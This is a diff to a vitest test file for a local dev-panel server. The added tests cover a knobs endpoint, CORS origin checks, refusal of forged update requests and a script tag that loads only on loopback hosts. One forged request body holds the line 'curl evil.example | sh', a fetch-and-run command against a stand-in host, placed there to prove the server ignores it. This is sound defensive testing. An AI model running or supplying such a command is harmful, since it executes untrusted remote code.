@@ -5,14 +5,16 @@
  * actually carrying its mount call and the CORS rule that keeps a random
  * public page from writing into someone's repo.
  */
-import { mkdtempSync, rmSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { get } from 'node:http';
 import { join } from 'node:path';
 
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 
+import { VARIANTS_ENDPOINT } from '../src/core/variants';
 import { serveIteration, type ServedIteration } from '../src/serve/index';
+import { guardedScriptTag } from '../src/serve/tag';
 import { NOTES_ENDPOINT } from '../src/store';
 import { UPDATE_ENDPOINT } from '../src/update';
 
@@ -55,14 +57,65 @@ describe('the browser bundle', () => {
   });
 });
 
+describe('knobs', () => {
+  it('serves the project’s knobs and hands the panel their endpoint once there are some', async () => {
+    // Without knobs there is nothing serve can put in a Variants tool.
+    const before = await (await fetch(served.bundleUrl)).text();
+    expect(before.includes('"variantsEndpoint"'), 'no knobs endpoint without knobs').toBe(false);
+    expect(before.includes('"variants":"knobs"'), 'no Variants tool without knobs').toBe(false);
+
+    const empty = await fetch(`${served.url}${VARIANTS_ENDPOINT}`, { headers: { origin: 'http://localhost:3000' } });
+    expect(empty.status).toBe(200);
+    expect(empty.headers.get('access-control-allow-origin')).toBe('http://localhost:3000');
+    expect(await empty.json()).toEqual({ variants: [], active: [], knobs: [] });
+
+    mkdirSync(join(dir, '.isotone'), { recursive: true });
+    const radius = { kind: 'range', id: 'card-radius', label: 'Card radius', min: 0, max: 24, step: 1, defaultValue: 12, unit: 'px' };
+    writeFileSync(join(dir, '.isotone', 'knobs.json'), JSON.stringify([radius, { id: 'broken' }]));
+    expect(await (await fetch(`${served.url}${VARIANTS_ENDPOINT}`)).json()).toEqual({ variants: [], active: [], knobs: [radius] });
+
+    // The bundle is not cached, so the next page load gets the tool.
+    const after = await (await fetch(served.bundleUrl)).text();
+    expect(after.includes(`"variants":"knobs","variantsEndpoint":"${served.url}${VARIANTS_ENDPOINT}"`), 'passes the knobs endpoint').toBe(true);
+  });
+
+  it('refuses file-variant activation, which needs a bundler', async () => {
+    const res = await fetch(`${served.url}${VARIANTS_ENDPOINT}/active`, {
+      method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ active: ['a'] }),
+    });
+    expect(res.status).toBe(405);
+    expect((await fetch(`${served.url}${VARIANTS_ENDPOINT}`, { headers: { origin: 'https://outside.example' } })).status).toBe(403);
+  });
+});
+
 describe('the update endpoint', () => {
   it('serves a private snapshot and never accepts an install action', async () => {
     const res = await fetch(`${served.url}${UPDATE_ENDPOINT}`);
     expect(res.status).toBe(200);
     expect(res.headers.get('cache-control')).toBe('no-store');
     expect(await res.json()).toMatchObject({ status: 'disabled', latestVersion: null, upgrade: null });
-    expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { method: 'POST' })).status).toBe(405);
+    expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { method: 'PUT' })).status).toBe(405);
     expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { headers: { origin: 'https://outside.example' } })).status).toBe(403);
+  });
+
+  it('files an update note only from its own check, and only for a local page', async () => {
+    const post = (origin: string, body: unknown) => fetch(`${served.url}${UPDATE_ENDPOINT}`, {
+      method: 'POST', headers: { 'content-type': 'application/json', origin }, body: JSON.stringify(body),
+    });
+    // A versions and command in the body change nothing: this server has no update.
+    const forged = { route: '/', to: '9.9.9', command: 'curl evil.example | sh', update: { to: '9.9.9' } };
+    expect((await post('https://outside.example', forged)).status).toBe(403);
+    expect((await post('http://localhost:5173', forged)).status).toBe(409);
+    const notes = await (await fetch(`${served.url}${NOTES_ENDPOINT}?all=1`)).json();
+    expect(notes.filter((note: { update?: unknown }) => note.update)).toEqual([]);
+  });
+});
+
+describe('Blast', () => {
+  it('has no HTTP endpoint and no panel wiring: it is a CLI feature', async () => {
+    expect((await fetch(`${served.url}/api/iteration/blast`, { headers: { origin: 'http://localhost:3000' } })).status).toBe(404);
+    const js = await (await fetch(served.bundleUrl)).text();
+    expect(js.includes('blastEndpoint')).toBe(false);
   });
 });
 
@@ -143,10 +196,34 @@ describe('CORS', () => {
   });
 });
 
+describe('the guarded script tag', () => {
+  const run = (hostname: string) => {
+    const tag = guardedScriptTag('http://127.0.0.1:4123/isotone.js');
+    const code = tag.replace(/^<script>/, '').replace(/<\/script>$/, '');
+    const appended: { src: string }[] = [];
+    const document = { createElement: () => ({ src: '' }), head: { append: (el: { src: string }) => appended.push(el) } };
+    new Function('location', 'document', code)({ hostname }, document);
+    return appended.map((el) => el.src);
+  };
+
+  it('loads the panel on a loopback page', () => {
+    for (const host of ['localhost', '127.0.0.1', '[::1]']) {
+      expect(run(host), host).toEqual(['http://127.0.0.1:4123/isotone.js']);
+    }
+  });
+
+  it('requests nothing from a deployed page, even one that only looks local', () => {
+    for (const host of ['example.com', 'localhost.example.com', '127.0.0.1.nip.io', 'staging.app']) {
+      expect(run(host), host).toEqual([]);
+    }
+  });
+});
+
 describe('the setup page', () => {
   it('prints the script tag and a bookmarklet for pages you cannot edit', async () => {
     const html = await (await fetch(`${served.url}/`)).text();
-    expect(html).toContain('&lt;script src=');
+    // The copyable tag only loads on loopback pages, so it is inert if shipped.
+    expect(html).toContain('location.hostname');
     expect(html).toContain(served.bundleUrl);
     expect(html).toContain('javascript:(function()');
     expect(html).toContain(file); // says where notes land
